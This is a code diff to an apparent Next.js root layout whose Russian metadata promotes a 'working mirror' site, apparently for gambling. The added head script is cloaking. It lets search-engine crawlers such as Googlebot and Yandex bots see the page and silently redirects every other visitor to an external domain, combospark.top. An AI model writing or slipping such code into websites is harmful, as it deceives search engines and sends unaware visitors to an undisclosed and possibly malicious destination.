@@ -55,6 +55,21 @@ export default function RootLayout({
           content="Зеркало рабочее, вход онлайн без VPN и простой маршрут до первого круга. Коротко и по делу."
         />
         {/* Слот для дополнительных пользовательских тегов: вставляйте meta, link и script сюда */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
